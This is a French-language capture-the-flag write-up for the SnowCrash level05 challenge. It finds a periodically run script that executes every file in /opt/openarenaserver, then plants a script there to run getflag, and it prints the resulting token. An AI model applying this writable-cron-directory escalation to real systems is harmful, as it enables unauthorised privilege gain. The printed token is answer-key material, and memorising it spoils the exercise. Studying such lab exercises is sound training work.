Rien dans le home, en cherchant les fichiers appartenant à flag05, on trouve ceci :

```
level05@SnowCrash:~$ find / -user flag05 2>/dev/null
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```

Voici le script :

```bash
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

Le script commence par regarder dans le répertoire **`/opt/openarenaserver`** et il boucle sur chaque fichier trouvé. Une limite de temps de 5 secondes est posée pour chaque exécution de script. Ensuite, il lance une nouvelle instance de bash et exécute le fichier (-x signifie qu’il affiche les commandes qu’il exécute). Enfin, il le supprime avec rm -f.

Il suffit donc de créer un script dans ce répertoire, de sorte à ce que lorsqu’il l’exécute, le script utilise la commande getflag, et retourne l’output dans un flag.txt :

```
echo "getflag > /tmp/flag.txt" > /opt/openarenaserver/script.sh
```

Le script **`/usr/sbin/openarenaserver`** semble être appelé à intervalles réguliers, ce qui suggère qu'il peut être contrôlé par un système comme **`cron`** ou un autre service similaire. Par conséquent, le **`flag.txt`** peut ne pas apparaître immédiatement après la création du script **`script.sh`**.

Et voici le flag retourné :

```
level05@SnowCrash:~$ cat /tmp/flag.txt
Check flag.Here is your token : viuaaale9huek52boumoomioc
```
